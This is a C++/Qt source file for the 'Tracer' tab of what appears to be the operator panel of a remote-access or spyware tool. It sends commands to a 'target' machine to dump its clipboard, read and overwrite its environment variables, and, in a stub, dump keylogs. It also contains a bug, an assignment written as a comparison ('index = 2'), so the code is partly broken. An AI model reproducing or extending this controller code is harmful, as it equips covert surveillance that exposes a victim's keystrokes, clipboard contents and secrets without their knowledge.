#include "uix/tracer.hpp"

// TODO: add a shortcut to search for certain env variable
// TODO: if item/text selected export only the selected part otherwise export all
// TODO: add the ability to copy one single item's key, value or as key:value (QMenu)
// TODO: add QMenu of actions in main list

gpanel::Tracer::Tracer(QWidget*parent) : TabWindow(parent), ui(new Ui::Tracer) {
    this->setup<Ui::Tracer>(this->ui, "Tracer");
    connect(
        this->ui->dump_target, &QPushButton::clicked,
        this, &Tracer::dump_target
    );
    connect(
        this->ui->env_vars, &QTreeWidget::itemChanged,
        this, &Tracer::on_env_item_changed
    );
    connect(
        this->ui->env_vars, &QTreeWidget::itemDoubleClicked,
        this, &Tracer::on_env_dbl_click
    );
    connect(
        this->ui->tabs, &QTabWidget::currentChanged,
        this, &Tracer::on_tab_changed
    );

    this->on_tab_changed(this->ui->tabs->currentIndex());
}

void gpanel::Tracer::on_tab_changed(unsigned char index) {
    bool h1 = true;
    bool h2 = true;
    
    if (index == 0) {
        h1 = false;
        h2 = true;
    }
    else if (index == 1) {
        h1 = true;
        h2 = true;
    }

    else if (index == 2) {
        h1 = true;
        h2 = false;
    }
    
    this->ui->klg_eactions->setHidden(h1);
    this->ui->env_eactions->setHidden(h2);
}

void gpanel::Tracer::on_env_dbl_click(QTreeWidgetItem* item, int column) {
    Qt::ItemFlags tmp = item->flags();
    if (column == 1) {
        item->setFlags(tmp | Qt::ItemIsEditable);
    } else if (tmp & Qt::ItemIsEditable) {
        item->setFlags(tmp ^ Qt::ItemIsEditable);
    }
}

void gpanel::Tracer::on_env_item_changed(QTreeWidgetItem*item) {
    if (!item) return;

    message_t msg;
    msg.set_command(WRITE_ENV);
    msg["key"] = msg.value(item->text(0).toStdString());
    msg["value"] = msg.value(item->text(1).toStdString());

    emit this->api_exeq(
        QString::fromStdString(msg.dump()),
        [](response_t response) {
            std::cout << response.as<std::string>() << "\n";
        }
    );
}


void gpanel::Tracer::dump_target() {
    unsigned char index = this->ui->tabs->currentIndex();
    message_t msg;

    if (index == 0) {
        // dump keylogs
    }

    else if (index == 1) {
        msg.set_command(DUMP_CB);

        emit this->api_exeq(QString::fromStdString(msg.dump()), [this](response_t response) {
            this->ui->clipboard_text->clear();
            
            this->ui->clipboard_text->setPlainText(
                QString::fromStdString(response.as<std::string>())
            );
        });
    }

    else if (index = 2) {
        msg.set_command(READ_AENV);
            
        emit this->api_exeq(QString::fromStdString(msg.dump()), [this](response_t response) {
            this->ui->env_vars->clear();

            if(response.log_level()) {
                logging::log_print(response.as<std::string>(), response.log_level());
            }
            else {
                this->populate(response.as<picojson::object>());
            }
        });
    }


}
void gpanel::Tracer::populate(picojson::object vars) {
    for (const auto &[key, value] : vars) {
        QTreeWidgetItem *item = new QTreeWidgetItem();
        item->setText(0, QString::fromStdString(key));
        item->setText(1, QString::fromStdString(value.to_str()));
        
        item->setFlags(item->flags() | Qt::ItemIsEditable);
        this->ui->env_vars->addTopLevelItem(item);
        
    }
}

gpanel::Tracer::~Tracer() {
    delete this->ui;
}
